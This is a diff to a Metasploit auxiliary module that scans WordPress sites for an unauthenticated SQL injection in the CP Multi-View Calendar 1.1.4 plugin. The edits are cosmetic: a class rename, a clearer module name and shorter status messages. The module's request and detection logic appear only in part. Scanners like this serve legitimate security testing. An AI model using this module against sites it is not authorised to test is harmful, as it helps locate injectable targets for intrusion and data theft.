@@ -6,7 +6,7 @@
 require 'uri'
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
@@ -14,7 +14,7 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'CP Multi-View Calendar Unauthenticated SQL Injection Scanner',
+      'Name'        => 'WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner',
       'Description' => %q{
         This module will scan given instances for an unauthenticated SQL injection
         within the CP Multi-View Calendar plugin v1.1.4 for Wordpress.
@@ -42,7 +42,7 @@ class Metasploit4 < Msf::Auxiliary
     left_marker = Rex::Text.rand_text_alpha(5)
     flag = Rex::Text.rand_text_alpha(5)
 
-    vprint_status("#{peer} - Checking host")
+    vprint_status("Checking host")
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, '/'),
@@ -55,14 +55,14 @@ class Metasploit4 < Msf::Auxiliary
     })
 
     unless res && res.body
-      vprint_error("#{peer} - Server did not respond in an expected way")
+      vprint_error("Server did not respond in an expected way")
       return
     end
 
     result = res.body =~ /#{left_marker}#{flag}#{right_marker}/
 
     if result
-      print_good("#{peer} - Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress")
+      print_good("Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress")
       report_vuln({
         :host  => rhost,
         :port  => rport,
